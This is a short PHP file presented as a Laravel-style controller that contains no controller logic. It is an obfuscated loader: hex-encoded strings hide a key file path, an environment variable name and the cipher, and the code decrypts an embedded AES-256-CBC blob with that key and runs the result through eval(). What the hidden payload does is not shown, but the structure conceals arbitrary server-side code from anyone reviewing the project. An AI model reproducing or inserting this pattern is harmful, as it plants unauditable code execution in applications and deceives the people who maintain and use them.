<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2bL5r2LJVD6RmsMU4nEhKQ==');

$c=base64_decode(

'q6o9bdY2dCePvwQX99xWhSC/uvYlD3jEU9EkiGeh7g84ZADfwDFYlzTtIf4LNKlU27hM48u6pGQz' .
'OJLzzmFjktK0vDipYGKypVYZSStlTwHqH66+1Umf+hfmnp3B2J1HKu7pt2EMQbliuuh7Vnl/DNCd' .
'joEY+mfCBM2p5MzM9VmN3+lo6qBTi8kfpC68T0UDoOCihs4LjmA/hunOOTdzrHlwxHjLag7NJKzF' .
'wY+FrpaVZSjwwYtT1GDA62YfiDFl'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

